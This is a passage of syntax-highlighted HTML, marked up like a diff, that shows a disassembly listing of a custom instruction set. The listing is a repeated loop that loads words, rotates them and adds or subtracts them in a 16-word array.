+<span style="color:#960050;background-color:#1e0010">192:</span>   <span style="color:#a6e22e">add</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">196:</span>   <span style="color:#a6e22e">mod</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r4</span>,<span style="color:#ae81ff">16</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">200:</span>   <span style="color:#a6e22e">mul</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r4</span>,<span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">204:</span>   <span style="color:#a6e22e">ld</span>       <span style="color:#66d9ef">r5</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">208:</span>   <span style="color:#a6e22e">rol</span>      <span style="color:#66d9ef">r5</span>,<span style="color:#66d9ef">r5</span>,<span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">212:</span>   <span style="color:#a6e22e">add</span>      <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r5</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">216:</span>   <span style="color:#a6e22e">st</span>       <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r2</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">220:</span>   <span style="color:#a6e22e">add</span>      <span style="color:#66d9ef">r1</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">224:</span>   <span style="color:#a6e22e">mul</span>      <span style="color:#66d9ef">r2</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">228:</span>   <span style="color:#a6e22e">ld</span>       <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r2</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">232:</span>   <span style="color:#a6e22e">add</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">236:</span>   <span style="color:#a6e22e">mod</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r4</span>,<span style="color:#ae81ff">16</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">240:</span>   <span style="color:#a6e22e">mul</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r4</span>,<span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">244:</span>   <span style="color:#a6e22e">ld</span>       <span style="color:#66d9ef">r5</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">248:</span>   <span style="color:#a6e22e">ror</span>      <span style="color:#66d9ef">r5</span>,<span style="color:#66d9ef">r5</span>,<span style="color:#ae81ff">9</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">252:</span>   <span style="color:#a6e22e">sub</span>      <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r5</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">256:</span>   <span style="color:#a6e22e">st</span>       <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r2</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">260:</span>   <span style="color:#a6e22e">add</span>      <span style="color:#66d9ef">r1</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">264:</span>   <span style="color:#a6e22e">mul</span>      <span style="color:#66d9ef">r2</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">268:</span>   <span style="color:#a6e22e">ld</span>       <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r2</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">272:</span>   <span style="color:#a6e22e">add</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">2</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">276:</span>   <span style="color:#a6e22e">mod</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r4</span>,<span style="color:#ae81ff">16</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">280:</span>   <span style="color:#a6e22e">mul</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r4</span>,<span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">284:</span>   <span style="color:#a6e22e">ld</span>       <span style="color:#66d9ef">r5</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">288:</span>   <span style="color:#a6e22e">ror</span>      <span style="color:#66d9ef">r5</span>,<span style="color:#66d9ef">r5</span>,<span style="color:#ae81ff">2</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">292:</span>   <span style="color:#a6e22e">sub</span>      <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r5</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">296:</span>   <span style="color:#a6e22e">st</span>       <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r2</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">300:</span>   <span style="color:#a6e22e">add</span>      <span style="color:#66d9ef">r1</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">304:</span>   <span style="color:#a6e22e">mul</span>      <span style="color:#66d9ef">r2</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">308:</span>   <span style="color:#a6e22e">ld</span>       <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r2</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">312:</span>   <span style="color:#a6e22e">add</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">2</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">316:</span>   <span style="color:#a6e22e">mod</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r4</span>,<span style="color:#ae81ff">16</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">320:</span>   <span style="color:#a6e22e">mul</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r4</span>,<span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">324:</span>   <span style="color:#a6e22e">ld</span>       <span style="color:#66d9ef">r5</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">328:</span>   <span style="color:#a6e22e">rol</span>      <span style="color:#66d9ef">r5</span>,<span style="color:#66d9ef">r5</span>,<span style="color:#ae81ff">12</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">332:</span>   <span style="color:#a6e22e">add</span>      <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r5</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">336:</span>   <span style="color:#a6e22e">st</span>       <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r2</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">340:</span>   <span style="color:#a6e22e">add</span>      <span style="color:#66d9ef">r1</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">344:</span>   <span style="color:#a6e22e">mul</span>      <span style="color:#66d9ef">r2</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">348:</span>   <span style="color:#a6e22e">ld</span>       <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r2</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">352:</span>   <span style="color:#a6e22e">add</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">7</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">356:</span>   <span style="color:#a6e22e">mod</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r4</span>,<span style="color:#ae81ff">16</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">360:</span>   <span style="color:#a6e22e">mul</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r4</span>,<span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">364:</span>   <span style="color:#a6e22e">ld</span>       <span style="color:#66d9ef">r5</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">368:</span>   <span style="color:#a6e22e">ror</span>      <span style="color:#66d9ef">r5</span>,<span style="color:#66d9ef">r5</span>,<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">372:</span>   <span style="color:#a6e22e">sub</span>      <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r5</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">376:</span>   <span style="color:#a6e22e">st</span>       <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r2</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">380:</span>   <span style="color:#a6e22e">add</span>      <span style="color:#66d9ef">r1</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">384:</span>   <span style="color:#a6e22e">mul</span>      <span style="color:#66d9ef">r2</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">388:</span>   <span style="color:#a6e22e">ld</span>       <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r2</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">392:</span>   <span style="color:#a6e22e">add</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">5</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">396:</span>   <span style="color:#a6e22e">mod</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r4</span>,<span style="color:#ae81ff">16</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">400:</span>   <span style="color:#a6e22e">mul</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r4</span>,<span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">404:</span>   <span style="color:#a6e22e">ld</span>       <span style="color:#66d9ef">r5</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">408:</span>   <span style="color:#a6e22e">ror</span>      <span style="color:#66d9ef">r5</span>,<span style="color:#66d9ef">r5</span>,<span style="color:#ae81ff">11</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">412:</span>   <span style="color:#a6e22e">sub</span>      <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r5</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">416:</span>   <span style="color:#a6e22e">st</span>       <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r2</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">420:</span>   <span style="color:#a6e22e">add</span>      <span style="color:#66d9ef">r1</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">424:</span>   <span style="color:#a6e22e">mul</span>      <span style="color:#66d9ef">r2</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">428:</span>   <span style="color:#a6e22e">ld</span>       <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r2</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">432:</span>   <span style="color:#a6e22e">add</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">436:</span>   <span style="color:#a6e22e">mod</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r4</span>,<span style="color:#ae81ff">16</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">440:</span>   <span style="color:#a6e22e">mul</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r4</span>,<span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">444:</span>   <span style="color:#a6e22e">ld</span>       <span style="color:#66d9ef">r5</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">448:</span>   <span style="color:#a6e22e">ror</span>      <span style="color:#66d9ef">r5</span>,<span style="color:#66d9ef">r5</span>,<span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">452:</span>   <span style="color:#a6e22e">sub</span>      <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r5</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">456:</span>   <span style="color:#a6e22e">st</span>       <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r2</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">460:</span>   <span style="color:#a6e22e">add</span>      <span style="color:#66d9ef">r1</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">464:</span>   <span style="color:#a6e22e">mul</span>      <span style="color:#66d9ef">r2</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">468:</span>   <span style="color:#a6e22e">ld</span>       <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r2</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">472:</span>   <span style="color:#a6e22e">add</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">476:</span>   <span style="color:#a6e22e">mod</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r4</span>,<span style="color:#ae81ff">16</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">480:</span>   <span style="color:#a6e22e">mul</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r4</span>,<span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">484:</span>   <span style="color:#a6e22e">ld</span>       <span style="color:#66d9ef">r5</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">488:</span>   <span style="color:#a6e22e">rol</span>      <span style="color:#66d9ef">r5</span>,<span style="color:#66d9ef">r5</span>,<span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">492:</span>   <span style="color:#a6e22e">add</span>      <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r5</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">496:</span>   <span style="color:#a6e22e">st</span>       <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r2</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">500:</span>   <span style="color:#a6e22e">add</span>      <span style="color:#66d9ef">r1</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">504:</span>   <span style="color:#a6e22e">mul</span>      <span style="color:#66d9ef">r2</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">508:</span>   <span style="color:#a6e22e">ld</span>       <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r2</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">512:</span>   <span style="color:#a6e22e">add</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">516:</span>   <span style="color:#a6e22e">mod</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r4</span>,<span style="color:#ae81ff">16</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">520:</span>   <span style="color:#a6e22e">mul</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r4</span>,<span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">524:</span>   <span style="color:#a6e22e">ld</span>       <span style="color:#66d9ef">r5</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">528:</span>   <span style="color:#a6e22e">ror</span>      <span style="color:#66d9ef">r5</span>,<span style="color:#66d9ef">r5</span>,<span style="color:#ae81ff">15</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">532:</span>   <span style="color:#a6e22e">sub</span>      <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r5</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">536:</span>   <span style="color:#a6e22e">st</span>       <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r2</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">540:</span>   <span style="color:#a6e22e">add</span>      <span style="color:#66d9ef">r1</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">544:</span>   <span style="color:#a6e22e">mul</span>      <span style="color:#66d9ef">r2</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">548:</span>   <span style="color:#a6e22e">ld</span>       <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r2</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">552:</span>   <span style="color:#a6e22e">add</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">11</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">556:</span>   <span style="color:#a6e22e">mod</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r4</span>,<span style="color:#ae81ff">16</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">560:</span>   <span style="color:#a6e22e">mul</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r4</span>,<span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">564:</span>   <span style="color:#a6e22e">ld</span>       <span style="color:#66d9ef">r5</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">568:</span>   <span style="color:#a6e22e">ror</span>      <span style="color:#66d9ef">r5</span>,<span style="color:#66d9ef">r5</span>,<span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">572:</span>   <span style="color:#a6e22e">sub</span>      <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r5</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">576:</span>   <span style="color:#a6e22e">st</span>       <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r2</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">580:</span>   <span style="color:#a6e22e">add</span>      <span style="color:#66d9ef">r1</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">584:</span>   <span style="color:#a6e22e">mul</span>      <span style="color:#66d9ef">r2</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">588:</span>   <span style="color:#a6e22e">ld</span>       <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r2</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">592:</span>   <span style="color:#a6e22e">add</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">13</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">596:</span>   <span style="color:#a6e22e">mod</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r4</span>,<span style="color:#ae81ff">16</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">600:</span>   <span style="color:#a6e22e">mul</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r4</span>,<span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">604:</span>   <span style="color:#a6e22e">ld</span>       <span style="color:#66d9ef">r5</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">608:</span>   <span style="color:#a6e22e">rol</span>      <span style="color:#66d9ef">r5</span>,<span style="color:#66d9ef">r5</span>,<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">612:</span>   <span style="color:#a6e22e">add</span>      <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r5</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">616:</span>   <span style="color:#a6e22e">st</span>       <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r2</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">620:</span>   <span style="color:#a6e22e">add</span>      <span style="color:#66d9ef">r1</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">624:</span>   <span style="color:#a6e22e">mul</span>      <span style="color:#66d9ef">r2</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">628:</span>   <span style="color:#a6e22e">ld</span>       <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r2</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">632:</span>   <span style="color:#a6e22e">add</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">14</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">636:</span>   <span style="color:#a6e22e">mod</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r4</span>,<span style="color:#ae81ff">16</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">640:</span>   <span style="color:#a6e22e">mul</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r4</span>,<span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">644:</span>   <span style="color:#a6e22e">ld</span>       <span style="color:#66d9ef">r5</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">648:</span>   <span style="color:#a6e22e">ror</span>      <span style="color:#66d9ef">r5</span>,<span style="color:#66d9ef">r5</span>,<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">652:</span>   <span style="color:#a6e22e">sub</span>      <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r5</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">656:</span>   <span style="color:#a6e22e">st</span>       <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r2</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
